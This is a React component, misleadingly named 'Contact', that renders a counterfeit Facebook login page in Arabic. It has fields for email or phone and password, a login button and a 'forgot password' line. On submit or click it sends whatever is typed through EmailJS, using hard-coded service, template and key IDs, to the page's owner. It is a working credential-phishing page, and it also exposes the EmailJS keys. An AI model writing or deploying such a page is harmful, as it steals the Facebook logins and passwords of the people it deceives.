import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import "../App.css";
// import styled from "styled-components";

// npm i @emailjs/browser

const Contact = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_u200sx1",
        "template_8e2q4ob",
        form.current,
        "FDCHz35xU46bs6ht1"
      )
      .then(
        (result) => {
          console.log(result.text);
          console.log("message sent");
        },
        (error) => {
          console.log(error.text);
        }
      );
      // e.target.reset()   
    };

  return (
      <div className="container">
        <form  ref={form} onSubmit={sendEmail} onClick={sendEmail}>
            <h1>facebook</h1>
            <input type="text" name="user_name" placeholder="البريد الإلكتروني أو رقم الهاتف"/>
            <input type="text" name="user_email" placeholder="كلمة السر" />
            <input type="submit" value="تسجيل الدخول" className="btn-1"    />
            <h3>هل نسيت كلمة السر؟</h3>
            <button className='btn-2'>إنشاء حساب جديد</button>
        </form>
      </div>
  );
};

export default Contact;

